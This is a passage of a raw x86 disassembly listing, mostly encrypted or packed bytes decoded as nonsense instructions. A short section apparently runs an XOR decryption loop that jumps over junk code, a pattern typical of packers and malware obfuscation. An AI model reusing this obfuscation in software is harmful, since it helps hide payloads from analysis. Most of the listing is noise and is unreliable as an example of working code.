  412469:	cwde   
  41246a:	push   esi
  41246b:	adc    al,0x39
  41246d:	add    cl,BYTE PTR [ebx]
  41246f:	lds    ebx,FWORD PTR [ecx+0xf3775c1]
  412475:	and    DWORD PTR [bx+si+0x258c],0xb0566ed
  41247e:	pushf  
  41247f:	shr    DWORD PTR [ecx-0x12],1
  412482:	jns    0x4124b0
  412484:	test   al,0x8a
  412486:	jo     0x4124b0
  412488:	mov    al,0xad
  41248a:	adc    cl,BYTE PTR [edx+0x75e3800f]
  412490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412491:	mov    edi,0xd72e63a8
  412496:	out    0x99,eax
  412498:	mov    esp,0xa1bdb656
  41249d:	xchg   edi,eax
  41249e:	fisubr WORD PTR [eax+0x5ad599ec]
  4124a4:	popf   
  4124a5:	(bad)  
  4124a6:	mov    dl,0xce
  4124a8:	mov    edi,0x89f1239b
  4124ad:	push   esi
  4124ae:	gs inc ecx
  4124b0:	(bad)  
  4124b1:	shl    DWORD PTR [edi],1
  4124b3:	(bad)  
  4124b5:	and    BYTE PTR [edx+edx*1+0x4e],bh
  4124b9:	pop    esi
  4124ba:	inc    esi
  4124bb:	dec    ebx
  4124bc:	int3   
  4124bd:	pop    esp
  4124be:	loop   0x412524
  4124c0:	lds    esi,FWORD PTR [esi+0x16]
  4124c3:	mov    DWORD PTR [ebp+0xc],ecx
  4124c6:	mov    DWORD PTR [ebp-0x60],0xba699577
  4124cd:	mov    DWORD PTR [ebp-0x5c],ecx
  4124d0:	mov    DWORD PTR [ebp-0x48],0xba69957b
  4124d7:	mov    DWORD PTR [ebp-0x44],ecx
  4124da:	mov    DWORD PTR [ebp-0x38],0xba69957f
  4124e1:	mov    DWORD PTR [ebp-0x34],ecx
  4124e4:	jmp    0x412a6e
  4124e9:	xchg   edi,eax
  4124ea:	(bad)  
  4124eb:	jbe    0x412531
  4124ed:	pop    esi
  4124ee:	adc    al,0x25
  4124f0:	mov    ah,0xc9
  4124f2:	pop    es
  4124f3:	shr    BYTE PTR [eax+0x68e4d6d7],cl
  4124f9:	push   edx
  4124fa:	es push ss
  4124fc:	push   ss
  4124fd:	cmp    eax,0xd3161604
  412502:	shl    DWORD PTR [esi-0x1209c1ec],cl
  412508:	push   0x864ffc67
  41250d:	fidiv  WORD PTR ds:0xd9345cd9
  412513:	cmp    DWORD PTR [esp+ebp*8],esp
  412516:	jmp    0x825177f
  41251b:	cmp    DWORD PTR [esi-0x76],esp
  41251e:	hlt    
  41251f:	or     ah,al
  412521:	jmp    0x4eb877b2
  412526:	call   0x57e07b78
  41252b:	mov    ebp,0x28854cc1
  412530:	push   cs
  412531:	addr16 sub ah,bh
  412534:	push   ebx
  412535:	sbb    BYTE PTR [ebp+ecx*4-0x1d],bh
  412539:	sti    
  41253a:	dec    edx
  41253b:	adc    ebx,esi
  41253d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41253e:	jl     0x412545
  412540:	aaa    
  412541:	push   edx
  412542:	dec    esi
  412543:	enter  0xbf9c,0x9c
  412547:	mov    dl,0x71
  412549:	test   BYTE PTR [esi],bl
  41254b:	push   edx
  41254c:	fld    DWORD PTR [ebx+0x6a]
  41254f:	mov    esp,0x6c8a7c6b
  412554:	xchg   edi,eax
  412555:	in     al,0xaa
  412557:	test   eax,0x2ce94937
  41255c:	outs   dx,BYTE PTR ds:[esi]
  41255d:	or     al,0xca
  41255f:	lahf   
  412560:	fwait
  412561:	inc    edi
  412562:	pop    es
  412563:	or     eax,edx
  412565:	push   0x17
  412567:	es jb  0x4124ec
  41256a:	mov    ds:0x3cedec35,eax
  41256f:	pusha  
  412570:	mov    bl,0x42
  412572:	inc    eax
  412573:	js     0x4125b6
  412575:	and    DWORD PTR [eax],0xfc6f2c6d
  41257b:	fyl2x  
  41257d:	sub    BYTE PTR gs:[edi-0x60],bh
  412581:	cmp    eax,DWORD PTR [eax]
  412583:	xchg   DWORD PTR [esp+edx*1+0x16],eax
  412587:	int3   
  412588:	popa   
  412589:	(bad)  
  41258a:	in     eax,0xe5
  41258c:	mov    ecx,0xfa240575
  412591:	stos   DWORD PTR es:[edi],eax
  412592:	lea    edi,[edx+0x14]
  412595:	clc    
  412596:	pushf  
  412597:	inc    esi
  412598:	adc    ebp,ebx
  41259a:	push   esp
  41259b:	add    al,0xc9
  41259d:	xchg   esp,eax
  41259e:	test   dl,0x6d
  4125a1:	outs   dx,BYTE PTR ds:[esi]
  4125a2:	test   DWORD PTR [ecx-0x63c1f109],0x7a29df91
  4125ac:	into   
  4125ad:	popf   
  4125ae:	popf   
  4125af:	push   esp
  4125b0:	(bad)  
  4125b1:	lock push eax
  4125b3:	mov    ds:0xf98b3564,eax
  4125b8:	sbb    DWORD PTR [eax],edx
  4125ba:	loop   0x4125cb
  4125bc:	xchg   edi,eax
  4125bd:	push   DWORD PTR [eax+0x2909b7fe]
  4125c3:	in     al,0x79
  4125c5:	mov    esi,0x5b402882
  4125ca:	and    ecx,DWORD PTR [esi+0x6e]
  4125cd:	or     DWORD PTR [ecx],esp
  4125cf:	or     DWORD PTR [edi+0x73],edx
  4125d2:	outs   dx,DWORD PTR ds:[esi]
  4125d3:	adc    al,0xbf
  4125d5:	jle    0x412567
  4125d7:	stc    
  4125d8:	ret    0x964a
  4125db:	lods   eax,DWORD PTR ds:[esi]
  4125dc:	and    al,0x81
  4125de:	pop    ebx
  4125df:	and    eax,0xba6afa28
  4125e4:	push   0xffffffd4
  4125e6:	xor    al,0x7f
  4125e8:	xor    BYTE PTR [eax],0x8a
  4125eb:	adc    eax,0xd81318a7
  4125f0:	outs   dx,DWORD PTR ds:[esi]
  4125f1:	call   0x1726:0xb9a78e
  4125f8:	or     ebp,ebx
  4125fa:	mov    eax,0xc8e80bde
  4125ff:	repnz stc 
  412601:	jno    0x412607
  412603:	xchg   esp,eax
  412604:	push   esp
  412605:	adc    al,0x42
  412607:	int3   
  412608:	jge    0x4125dd
  41260a:	sbb    ecx,DWORD PTR [ebx+0x7c]
  41260d:	mov    ecx,DWORD PTR [esp+edx*4+0x72]
  412611:	push   0x62
  412613:	(bad)  
  412614:	mov    es,WORD PTR [ebp+0xf0bb45a]
  41261a:	mov    ds,ebx
  41261c:	xchg   esp,eax
  41261d:	pop    es
  41261e:	and    ebx,0xbcc58edf
  412624:	pop    ds
  412625:	sub    eax,0x4280bbae
  41262a:	cli    
  41262b:	sbb    eax,0x15aa6378
  412630:	and    ecx,DWORD PTR es:[ecx+0x3fc0e826]
  412637:	lahf   
  412638:	mov    al,ds:0x8d0c323d
  41263d:	pop    ebx
  41263e:	jne    0x412610
  412640:	stc    
  412641:	push   esi
  412642:	std    
  412643:	leave  
  412644:	in     al,dx
  412645:	push   ds
  412646:	push   esi
  412647:	dec    eax
  412648:	(bad)  
  412649:	mov    esi,0x9d6ffc95
  41264e:	xchg   ecx,ebx
  412650:	bound  edx,QWORD PTR [ebx-0x4a]
  412653:	js     0x412642
  412655:	stc    
  412656:	sbb    al,0x70
  412658:	call   0x77e3:0x6e10526
  41265f:	xor    dl,BYTE PTR [ecx+0x23]
  412662:	jno    0x4125f3
  412664:	xchg   BYTE PTR [edx],cl
  412666:	mov    bl,0x4
  412668:	stos   BYTE PTR es:[edi],al
  412669:	std    
  41266a:	jno    0x41268d
  41266c:	sub    eax,0x9100ff5c
  412671:	dec    esp
  412672:	adc    bh,BYTE PTR [ecx]
  412674:	push   cs
  412675:	lock in eax,0x18
  412678:	addr16 pop edi
  41267a:	lods   eax,DWORD PTR ds:[esi]
  41267b:	or     edx,ebx
  41267d:	mov    BYTE PTR [esi-0x23],dl
  412680:	cdq    
  412681:	xchg   cl,bl
  412683:	mov    ah,0x6a
  412685:	mov    cl,BYTE PTR [ebx-0x4b5c4ca0]
  41268b:	inc    edx
  41268c:	lock jnp 0x41270a
  41268f:	bound  ebx,QWORD PTR ds:0x953bafc4
  412695:	retf   
  412696:	push   ds
  412697:	stc    
  412698:	test   DWORD PTR [ebp-0x6dcfc83d],ebx
  41269e:	and    DWORD PTR [edx-0x40],esp
  4126a1:	inc    edx
  4126a2:	adc    al,0x7
  4126a4:	ins    BYTE PTR es:[edi],dx
  4126a5:	outs   dx,BYTE PTR ds:[esi]
  4126a6:	shr    DWORD PTR [edi+0x6bdc0535],cl
  4126ac:	mov    dl,0x65
  4126ae:	enter  0x462d,0xfa
  4126b2:	jecxz  0x412659
  4126b4:	popf   
  4126b5:	fsub   st(0),st
  4126b7:	sub    BYTE PTR [edi-0x8],bl
  4126ba:	add    DWORD PTR [ebp+0x665363ad],edi
  4126c0:	mov    cl,0x12
  4126c2:	in     eax,dx
  4126c3:	cli    
  4126c4:	xchg   ecx,eax
  4126c5:	cs arpl bx,bx
  4126c8:	stos   DWORD PTR es:[edi],eax
  4126c9:	mov    WORD PTR [ecx],ds
  4126cb:	or     bh,al
  4126cd:	sub    ebx,DWORD PTR [ecx+0x68]
  4126d0:	addr16 xchg esi,eax
  4126d2:	push   0xd156227c
  4126d7:	clc    
  4126d8:	ret    
  4126d9:	mov    eax,ds:0xff73214f
  4126de:	ds int 0xfc
  4126e1:	dec    esi
  4126e2:	mov    ds:0x2bc87e98,al
  4126e7:	dec    edx
  4126e8:	fidiv  WORD PTR [ecx-0xdc2cb11]
  4126ee:	pop    es
  4126ef:	cmp    eax,DWORD PTR [ebx]
  4126f1:	xor    bh,dh
  4126f3:	push   esp
  4126f4:	xor    edi,DWORD PTR [edx+esi*2-0x19daf96f]
  4126fb:	xchg   dh,ch
  4126fd:	test   BYTE PTR [ebp-0x21],cl
  412700:	retf   0x9004
  412703:	xchg   DWORD PTR [eax+0x457384f5],esp
  412709:	sti    
  41270a:	sahf   
  41270b:	(bad)  
  41270c:	int    0x5b
  41270e:	std    
  41270f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412711:	pushf  
  412712:	dec    ebx
  412713:	inc    esi
  412714:	out    dx,al
  412715:	add    DWORD PTR [eiz*4-0x28b7658e],edx
  41271c:	jmp    0x949c:0x12732af6
  412723:	js     0x62a7c47c
  412729:	nop
  41272a:	dec    edx
  41272b:	jne    0x4126d3
  41272d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41272e:	adc    edi,esp
  412730:	les    ebp,FWORD PTR [edi+0x6e]
  412733:	cmp    bl,bl
  412735:	xchg   ecx,eax
  412736:	jp     0x4127b0
  412738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412739:	xchg   edi,eax
  41273a:	inc    edi
  41273b:	outs   dx,BYTE PTR ds:[esi]
  41273c:	or     BYTE PTR [esi],dh
  41273e:	sub    eax,0x2eaf87fd
  412743:	or     DWORD PTR [eax-0x7e],ebx
  412746:	xor    edx,ecx
  412748:	ins    BYTE PTR es:[edi],dx
  412749:	push   ds
  41274a:	push   esp
  41274b:	sub    eax,0x8ed5c525
  412750:	jge    0x41273c
  412752:	repz sbb DWORD PTR [esi+edi*8],esi
  412756:	mov    esi,0xbcd6d16
  41275b:	sub    eax,0x78f885ea
  412760:	sub    eax,0xce7fcb97
  412765:	push   ebx
  412766:	shl    DWORD PTR [eax+0x15d7a905],cl
  41276c:	mov    al,0x71
  41276e:	pop    edi
  41276f:	dec    edx
  412770:	push   ebx
  412771:	inc    ebx
  412772:	pusha  
  412773:	je     0x4127c3
  412775:	retf   
  412776:	or     DWORD PTR [ebp-0x22ee5dae],0xb76900ed
  412780:	mov    edi,0x45a63663
  412785:	pop    ebx
  412786:	adc    eax,0x89d8fca1
  41278b:	mov    WORD PTR [ebx],ds
  41278d:	sub    al,0xd2
  41278f:	aad    0xdb
  412791:	fldenv [edi-0x7c239a22]
  412797:	jge    0x412814
  412799:	mov    ds:0x90ee1ff,al
  41279e:	adc    DWORD PTR [eax-0x80],ecx
  4127a1:	rol    BYTE PTR [ebx+0x1619e0ee],1
  4127a7:	adc    BYTE PTR [ecx],bl
  4127a9:	mul    DWORD PTR [ecx-0x74]
  4127ac:	loopne 0x4127f5
  4127ae:	inc    edi
  4127af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127b0:	push   edi
  4127b1:	mov    ecx,0xa4d0070c
  4127b6:	jbe    0x41282d
  4127b8:	sbb    eax,0x82bcba6c
  4127bd:	or     eax,edi
  4127bf:	and    ebp,edx
  4127c1:	or     bl,bl
  4127c3:	lods   al,BYTE PTR ds:[esi]
  4127c4:	sub    al,0xa7
  4127c6:	dec    ebx
  4127c7:	dec    edi
  4127c8:	aas    
  4127c9:	sub    BYTE PTR [ebx+0x35],0xd7
  4127cd:	inc    esp
  4127ce:	lds    ebx,FWORD PTR [ebp+0x5c]
  4127d1:	sub    bl,BYTE PTR [ebx]
  4127d3:	xor    ebp,ebp
  4127d5:	iret   
  4127d6:	bound  esi,QWORD PTR [ebp+0x644d2f33]
  4127dc:	push   esp
  4127dd:	mov    ds:0x72b3334f,eax
  4127e2:	push   0xcff19a61
  4127e7:	jmp    0x224c:0xaa006f61
  4127ee:	dec    ebp
  4127ef:	adc    eax,esi
  4127f1:	out    0xd3,eax
  4127f3:	out    dx,eax
  4127f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127f5:	jle    0x412793
  4127f7:	es repz mov ebx,cs
  4127fb:	xor    eax,0xf504c4a8
  412800:	test   eax,0xede7d076
  412805:	ins    BYTE PTR es:[edi],dx
  412806:	mov    ebx,esp
  412808:	pop    ebx
  412809:	retf   
  41280a:	fmul   st,st(4)
  41280c:	fstp   TBYTE PTR [edi]
  41280e:	cs (bad) 
  412810:	pop    ebx
  412811:	jnp    0x412811
  412813:	or     BYTE PTR [edx+0x4b],0xc1
  412817:	(bad)  
  412818:	daa    
  412819:	dec    eax
  41281a:	dec    edx
  41281b:	ds dec edx
  41281d:	not    BYTE PTR [ecx]
  41281f:	or     eax,0xc29c70d0
  412824:	or     dh,BYTE PTR ds:0xcb9a0e1b
  41282a:	ins    DWORD PTR es:[edi],dx
  41282b:	ins    BYTE PTR es:[edi],dx
  41282c:	ret    
  41282d:	aaa    
  41282e:	and    dl,al
  412830:	test   BYTE PTR [edi],ch
  412832:	and    bl,BYTE PTR [eax-0x5e1144a0]
  412838:	sub    DWORD PTR [ebx+eax*1],esp
  41283b:	fcmovb st,st(3)
  41283d:	pop    ss
  41283e:	inc    edx
  41283f:	xor    esi,DWORD PTR [ebx-0x56]
  412842:	pop    es
  412843:	mov    DWORD PTR [ebx],esi
  412845:	scas   eax,DWORD PTR es:[edi]
  412846:	sti    
  412847:	mov    ds:0xb607f37b,al
  41284c:	sub    DWORD PTR [edx+0x6f],esp
  41284f:	cdq    
  412850:	dec    ebp
  412851:	(bad)  
  412852:	xor    BYTE PTR [ecx-0x176c35cb],bh
  412858:	ins    DWORD PTR es:[edi],dx
  412859:	cs add bl,ch
  41285c:	pop    edi
  41285d:	or     eax,0x81909f15
  412862:	push   esp
  412863:	sbb    ch,BYTE PTR [edi+ecx*2]
  412866:	out    0x72,eax
  412868:	sbb    DWORD PTR [ecx-0x51],ecx
  41286b:	lock pop esp
  41286d:	mov    ds:0x92f7721,eax
  412872:	outs   dx,DWORD PTR ds:[esi]
  412873:	jo     0x412816
  412875:	adc    eax,0x64e36c5b
  41287a:	jnp    0x4128cf
  41287c:	sar    dl,0xd
  41287f:	iret   
  412880:	retf   0x7a80
  412883:	stc    
  412884:	push   es
  412885:	addr16 call 0xe9a4:0xd9d81f0f
  41288d:	pop    ss
  41288e:	mov    dl,ah
  412890:	jno    0x41289b
  412892:	jo     0x4128e8
  412894:	je     0x412910
  412896:	push   ds
  412897:	cmp    DWORD PTR [esi],edx
  412899:	sub    al,0xa5
  41289b:	rcr    DWORD PTR [ebx-0x7b],0xe5
  41289f:	nop
  4128a0:	lock add al,0x51
  4128a3:	std    
  4128a4:	pop    esp
  4128a5:	jle    0x412888
  4128a7:	(bad)  
  4128a8:	imul   eax,ebx,0xffffff9d
  4128ab:	test   al,0xa0
  4128ad:	pop    ds
  4128ae:	(bad)  
  4128af:	push   ss
  4128b0:	mov    bl,0x70
  4128b2:	sbb    al,0xa2
  4128b4:	stos   DWORD PTR es:[edi],eax
  4128b5:	mov    edi,0xa45bafff
  4128ba:	stc    
  4128bb:	enter  0x3806,0x8
  4128bf:	add    al,0xcf
  4128c1:	inc    ebp
  4128c2:	inc    eax
  4128c3:	push   cs
  4128c4:	jb     0x41289c
  4128c6:	adc    DWORD PTR [esp+ebp*4-0x2ccb6399],edx
  4128cd:	mov    esp,0x7c73180a
  4128d2:	ins    BYTE PTR es:[edi],dx
  4128d3:	mov    bh,0x83
  4128d5:	xor    dl,al
  4128d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128d8:	sub    cl,BYTE PTR [eax+0x1bca2f11]
  4128de:	bswap  ebp
  4128e0:	mov    bh,0x82
  4128e2:	cmp    ah,dh
  4128e4:	sub    eax,0x5498d71c
  4128e9:	mov    BYTE PTR [esi],bl
  4128eb:	(bad)  
  4128ec:	nop
  4128ed:	(bad)  
  4128ee:	call   0x8ef02268
  4128f3:	jmp    0x6d8f:0x789ff7cd
  4128fa:	loope  0x41295d
  4128fc:	add    al,0x69
  4128fe:	push   eax
  4128ff:	cmp    dh,bl
  412901:	mov    edx,0xc37c9dd7
  412906:	pop    edx
  412907:	jp     0x41290f
  412909:	cld    
  41290a:	mov    ss,WORD PTR [ecx+0x4206cba1]
  412910:	fwait
  412911:	cs ins BYTE PTR es:[edi],dx
  412913:	repz dec edx
  412915:	dec    ebp
  412916:	sbb    BYTE PTR [ebx-0x2c],cl
  412919:	test   eax,0x57e83832
  41291e:	dec    ebp
  41291f:	out    0xe2,eax
  412921:	iret   
  412922:	push   0x62116155
  412927:	mov    ch,0x60
  412929:	imul   ebx,DWORD PTR [ebx],0xf0cad1e3
  41292f:	fsub   QWORD PTR [ecx]
  412931:	fld    DWORD PTR [ebp+0x193f3771]
  412937:	or     DWORD PTR [eax+edi*1-0x69],0xa
  41293c:	(bad)  
  41293d:	xchg   edx,eax
  41293e:	dec    esp
  41293f:	pop    ebx
  412940:	sbb    DWORD PTR [eax],0xf5d5786c
  412946:	test   al,0xa6
  412948:	das    
  412949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41294a:	out    dx,al
  41294b:	ins    DWORD PTR es:[edi],dx
  41294c:	or     al,0xb8
  41294e:	xchg   ebx,eax
  41294f:	adc    al,0x33
  412951:	sub    DWORD PTR [esi-0xb058df9],edx
  412957:	inc    ecx
  412958:	ss mov esp,0xafcc6390
  41295e:	or     BYTE PTR [ecx+edx*2],ch
  412961:	test   BYTE PTR [eax],0x2f
  412964:	xchg   edx,ebp
  412966:	pop    edx
  412967:	sar    BYTE PTR [ebp*8+0x2c8d4f0b],0x3c
  41296f:	sbb    al,0x14
  412971:	test   DWORD PTR [ecx+0x4b],ebx
  412974:	sbb    BYTE PTR [ecx+0x74],dh
  412977:	xor    al,0x7c
  412979:	es mov bl,bh
  41297c:	cmp    DWORD PTR [eax-0x19a69332],edi
  412982:	inc    eax
  412983:	cwde   
  412984:	adc    al,0xc0
  412986:	or     BYTE PTR [ebx+0x752fa34b],0x99
  41298d:	lds    edi,FWORD PTR [ecx]
  41298f:	test   dh,bl
  412991:	fdiv   st(1),st
  412993:	sbb    al,BYTE PTR ds:0x56561dd
  412999:	adc    eax,0x932230f1
  41299e:	push   esi
  41299f:	ja     0x4129d4
  4129a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129a2:	cld    
  4129a3:	lds    esi,FWORD PTR [edx]
  4129a5:	fwait
  4129a6:	pop    eax
  4129a7:	xchg   DWORD PTR [ebp-0x45c15239],ebx
  4129ad:	mov    ds:0xe5ccf3d1,al
  4129b2:	fld    st(5)
  4129b4:	cmp    eax,0x1169c078
  4129b9:	repnz ror DWORD PTR ds:0xfaf45a2d,0x74
  4129c1:	lea    ebp,[ecx+0x4adb41fe]
  4129c7:	lods   eax,DWORD PTR ds:[esi]
  4129c8:	fld    TBYTE PTR [edx]
  4129ca:	jns    0x41295f
  4129cc:	adc    dl,BYTE PTR [edi+ebx*1+0x7e58b19a]
  4129d3:	add    ecx,DWORD PTR [esi-0x61]
  4129d6:	ins    BYTE PTR es:[edi],dx
  4129d7:	jmp    0x7708:0x7f26f7d2
  4129de:	dec    eax
  4129df:	popa   
  4129e0:	mov    DWORD PTR [ebx],ecx
  4129e2:	inc    ebp
  4129e3:	in     al,0x7
  4129e5:	sbb    al,0x19
  4129e7:	repnz retf 0xd844
  4129eb:	sbb    DWORD PTR [ecx+ebp*4+0x23],ebp
  4129ef:	cmc    
  4129f0:	div    BYTE PTR [edi+0x2c]
  4129f3:	sbb    BYTE PTR [ebx],dh
  4129f5:	std    
  4129f6:	dec    eax
  4129f7:	cmp    ecx,DWORD PTR ds:0x2e5421bc
  4129fd:	cmp    BYTE PTR [edi-0x7625e77e],cl
  412a03:	int3   
  412a04:	into   
  412a05:	out    0xa0,eax
  412a07:	xchg   DWORD PTR [eax+ebx*4],esi
  412a0a:	inc    edx
  412a0b:	xchg   ecx,eax
  412a0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a0d:	stc    
  412a0e:	xor    al,0x41
  412a10:	dec    eax
  412a11:	mov    dl,0xf8
  412a13:	and    ch,dl
  412a15:	imul   edi,ebx,0x190b1802
  412a1b:	jne    0x412a10
  412a1d:	outs   dx,BYTE PTR ds:[esi]
  412a1e:	rcr    DWORD PTR [ebp+0x75],cl
  412a21:	or     eax,0xb63569a7
  412a26:	cld    
  412a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a28:	mov    dh,0x5c
  412a2a:	ret    0xf21f
  412a2d:	fld    DWORD PTR [esi+0x3e46abc5]
  412a33:	retf   
  412a34:	les    ecx,FWORD PTR [ecx-0x4dce71e2]
  412a3a:	les    esp,FWORD PTR [ebx-0x51]
  412a3d:	(bad)
  412a40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a41:	xor    al,0xe
  412a43:	or     eax,0x30e474a8
  412a48:	test   eax,0x4e47df8d
  412a4d:	mov    es,WORD PTR [edx]
  412a4f:	pop    edx
  412a50:	mov    ecx,0xe9c0c264
  412a55:	xchg   DWORD PTR [ecx+0x66],esi
  412a58:	pop    es
  412a59:	lahf   
  412a5a:	ins    BYTE PTR es:[edi],dx
  412a5b:	data16 cmp cl,dh
  412a5e:	add    edx,DWORD PTR [edi-0x5a]
  412a61:	lods   eax,DWORD PTR ds:[esi]
  412a62:	sub    BYTE PTR [ecx+ebp*8+0x25efe846],dh
  412a69:	mov    WORD PTR [ecx-0x2a],?
  412a6c:	jae    0x412a77
  412a6e:	mov    eax,DWORD PTR [ebp+0x8]
  412a71:	mov    ecx,DWORD PTR [ebp+0xc]
  412a74:	shrd   eax,ecx,0x2
  412a78:	shr    ecx,0x2
  412a7b:	mov    ecx,DWORD PTR [ebp+0x8]
  412a7e:	mov    edx,DWORD PTR [ebp+0xc]
  412a81:	xor    eax,edi
  412a83:	shl    ecx,0x1e
  412a86:	xor    edx,edx
  412a88:	or     eax,edx
  412a8a:	add    eax,DWORD PTR ds:0x422298
  412a90:	mov    DWORD PTR [ebp+0x14],eax
  412a93:	mov    eax,DWORD PTR [ebp+0x8]
  412a96:	mov    ecx,DWORD PTR [ebp+0xc]
  412a99:	shrd   eax,ecx,0x2
  412a9d:	shr    ecx,0x2
  412aa0:	mov    ecx,DWORD PTR [ebp+0x8]
  412aa3:	mov    edx,DWORD PTR [ebp+0xc]
  412aa6:	xor    eax,edi
  412aa8:	shl    ecx,0x1e
  412aab:	xor    edx,edx
  412aad:	or     eax,edx
  412aaf:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  412ab3:	mov    eax,DWORD PTR [ebp+0x14]
  412ab6:	xor    BYTE PTR [eax],cl
  412ab8:	mov    eax,DWORD PTR [ebp-0x60]
  412abb:	mov    ecx,DWORD PTR [ebp-0x5c]
  412abe:	shrd   eax,ecx,0x2
  412ac2:	shr    ecx,0x2
  412ac5:	mov    ecx,DWORD PTR [ebp-0x60]
  412ac8:	mov    edx,DWORD PTR [ebp-0x5c]
  412acb:	xor    eax,edi
  412acd:	shl    ecx,0x1e
  412ad0:	xor    edx,edx
  412ad2:	or     eax,edx
  412ad4:	add    eax,DWORD PTR ds:0x422298
  412ada:	mov    DWORD PTR [ebp+0x14],eax
  412add:	mov    eax,DWORD PTR [ebp-0x60]
  412ae0:	mov    ecx,DWORD PTR [ebp-0x5c]
  412ae3:	shrd   eax,ecx,0x2
  412ae7:	shr    ecx,0x2
  412aea:	mov    ecx,DWORD PTR [ebp-0x60]
  412aed:	mov    edx,DWORD PTR [ebp-0x5c]
  412af0:	jmp    0x41307a
  412af5:	xchg   ebx,eax
  412af6:	retf   
  412af7:	cs (bad) 
  412af9:	push   ds
  412afa:	adc    dl,BYTE PTR [edx]
  412afc:	mov    ds:0x683e5c87,eax
  412b01:	aas    
  412b02:	pop    ebx
  412b03:	push   esp
  412b04:	mov    dl,0x89
  412b06:	adc    dl,BYTE PTR [esi]
  412b08:	push   ss
  412b09:	cmp    eax,0xb9161604
  412b0e:	sub    cl,dh
  412b10:	out    0xae,eax
  412b12:	(bad)
  412b15:	sbb    eax,0x61538b02
  412b1a:	or     eax,0x5837fc40
  412b1f:	cmp    esi,edx
  412b21:	push   eax
  412b22:	lock mov dh,0x3f
  412b25:	add    bl,BYTE PTR [eax+0x177a807a]
  412b2b:	sub    BYTE PTR [esi],ah
  412b2d:	push   esp
  412b2e:	call   0x6b96eebd
  412b33:	pusha  
  412b34:	mov    al,0x82
  412b36:	sbb    dh,BYTE PTR [edx-0x79]
  412b39:	and    ebp,DWORD PTR [edx-0x33]
  412b3c:	inc    esp
  412b3d:	push   cs
  412b3e:	mov    al,ds:0xf8e5680
  412b43:	retf   0xfaf1
  412b46:	inc    ebx
  412b47:	in     al,0xa5
  412b49:	sbb    bh,ah
  412b4b:	jae    0x412b8c
  412b4d:	lods   al,BYTE PTR ds:[esi]
  412b4e:	and    cl,BYTE PTR [eax]
  412b50:	pop    edx
  412b51:	pushf  
  412b52:	je     0x412b55
  412b54:	push   ecx
  412b55:	call   0x90a3:0x3bb2
  412b5b:	inc    edi
  412b5c:	popa   
  412b5d:	aad    0x14
  412b5f:	mov    ebp,0x10340c1f
  412b64:	mov    ebp,0xc506758d
  412b69:	sbb    eax,DWORD PTR [esi]
  412b6b:	enter  0xae1c,0x39
  412b6f:	loope  0x412bd2
  412b71:	jecxz  0x412b4f
  412b73:	hlt    
  412b74:	pop    ds
  412b75:	inc    esi
  412b76:	out    dx,eax
  412b77:	and    al,0xf9
  412b79:	stos   BYTE PTR es:[edi],al
  412b7a:	add    al,0xd1
  412b7c:	arpl   sp,ax
  412b7e:	rcl    dl,cl
  412b80:	addr16 mov esi,0xf16e6df8
  412b86:	aas    
  412b87:	mov    ecx,0x4c2d8a9e
  412b8c:	(bad)  
  412b8d:	cwde   
  412b8e:	inc    edx
  412b8f:	cmp    eax,0xb4b76bb0
  412b94:	pop    ebp
  412b95:	ins    BYTE PTR es:[edi],dx
  412b96:	jo     0x412b38
  412b98:	add    BYTE PTR [edi+0x26],al
  412b9b:	sar    al,1
  412b9d:	hlt    
  412b9e:	outs   dx,DWORD PTR ds:[esi]
  412b9f:	cdq    
  412ba0:	test   al,0x2e
  412ba2:	(bad)  
  412ba3:	loopne 0x412b6e
  412ba5:	test   eax,0x22f8f252
  412baa:	xor    eax,DWORD PTR [edx-0x9]
  412bad:	test   DWORD PTR [edi],ebx
  412baf:	icebp  
  412bb0:	sbb    edi,DWORD PTR [edi]
  412bb2:	popa   
  412bb3:	cs dec ebx
  412bb5:	mov    al,0xb
  412bb7:	loope  0x412bb9
  412bb9:	scas   al,BYTE PTR es:[edi]
  412bba:	mov    ss,ecx
  412bbc:	inc    eax
  412bbd:	icebp  
  412bbe:	push   ds
  412bbf:	dec    ebp
  412bc0:	xor    dh,dl
  412bc2:	bound  esp,QWORD PTR [edi-0x4f]
  412bc5:	jae    0x412bf3
  412bc7:	mov    al,ds:0x5dd0ac67
  412bcc:	jl     0x412bcc
  412bce:	imul   edx,DWORD PTR [edi],0xc75fd124
  412bd4:	xor    BYTE PTR [ecx],al
  412bd6:	xchg   esi,eax
  412bd7:	(bad)  
  412bd8:	xchg   esi,eax
  412bd9:	xor    bl,al
  412bdb:	loop   0x412c5a
  412bdd:	or     bh,bh
  412bdf:	fcomp  QWORD PTR [edx+0x1e434e2f]
  412be5:	and    ebx,DWORD PTR [esi-0xa]
  412be8:	mov    ebx,esi
  412bea:	repnz pushf 
  412bec:	xor    ecx,DWORD PTR [edi+0x51]
  412bef:	imul   esp,DWORD PTR ds:[ecx],0xd06e7cbe
  412bf6:	js     0x412c47
  412bf8:	mov    esp,0x1dc4a78f
  412bfd:	xor    eax,0x5e187c77
  412c02:	or     ch,ch
  412c04:	dec    ecx
  412c05:	std    
  412c06:	clc    
  412c07:	(bad)  [ebx+0x1bc723dd]
  412c0d:	rol    BYTE PTR [ebp+0x4f],1
  412c10:	dec    ebp
  412c11:	add    BYTE PTR ds:0x496a947a,cl
  412c17:	cmp    BYTE PTR [esi-0x77],ah
  412c1a:	xor    bx,dx
  412c1d:	inc    edx
  412c1e:	xor    esp,esp
  412c20:	mov    BYTE PTR [ebx-0x6a],0x62
  412c24:	xchg   DWORD PTR [eax-0x30005192],eax
  412c2a:	inc    edi
  412c2b:	dec    edi
  412c2c:	dec    esi
  412c2d:	mov    es,WORD PTR [ebx-0x6a]
  412c30:	and    al,0x8d
  412c32:	loope  0x412c7d
  412c34:	pop    ebx
